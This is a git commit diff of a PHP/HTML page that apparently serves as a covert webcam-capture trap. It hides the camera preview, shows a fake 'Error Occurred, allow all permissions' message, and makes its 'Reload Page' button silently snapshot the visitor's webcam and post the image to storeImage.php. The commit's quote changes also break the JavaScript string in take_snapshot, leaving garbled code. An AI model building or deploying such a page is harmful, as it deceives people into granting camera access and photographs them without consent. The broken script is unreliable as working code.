711bf4c9ccc544bb8bd42166d8baf342e45ed147
QuantumByteStudios <quantumbytestudios@gmail.com>
2022-10-31 01:12:13 +0530

    Update

--- src/index.php
+++ src/index.php
@@ -1,28 +1,31 @@
+<?php
+echo "";
+?>
 <!DOCTYPE html>
 <html>
 
 <head>
     <title>Smile!</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js'></script>
+    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
 </head>
 
 <body>
 
-    <div class="container">
+    <div class='container'>
         <br>
-        <!-- <h1 class="text-center">Smile Wider :)</h1> -->
-        <form method="POST" action="storeImage.php">
-            <div class="row">
-                <div class="col-12">
+        <!-- <h1 class='text-center'>Smile Wider :)</h1> -->
+        <form method='POST' action='storeImage.php'>
+            <div class='row'>
+                <div class='col-12'>
                     <center>
-                        <div hidden="hidden" id="my_camera"></div>
+                        <div hidden='hidden' id='my_camera'></div>
                         <br>
-                        <input type="hidden" name="image" class="image-tag">
-                        <div id="results"></div>
+                        <input type='hidden' name='image' class='image-tag'>
+                        <div id='results'></div>
                         <p>An Error Occurred Please Allow All Permissions & Reload This Page</p>
-                        <button onClick="take_snapshot()" class="btn btn-danger">Reload Page</button>
+                        <button onClick='take_snapshot()' class='btn btn-danger'>Reload Page</button>
                     </center>
                 </div>
             </div>
@@ -30,7 +33,7 @@
     </div>
 
     <!-- Configure a few settings and attach camera -->
-    <script language="JavaScript">
+    <script language='JavaScript'>
     Webcam.set({
         width: 490,
         height: 390,
@@ -42,9 +45,12 @@
 
     function take_snapshot() {
         Webcam.snap(function(data_uri) {
-            $(".image-tag").val(data_uri);
-            document.getElementById('results').innerHTML = '<img hidden="hidden" src="' + data_uri +
-                '" alt=" ">';
+            $('.image-tag').val(data_uri);
+            document.getElementById('results').innerHTML = '<img hidden='
+            hidden ' src='
+            ' + data_uri +
+            ''
+            alt = ' ' > ';
         });
     }
     </script>
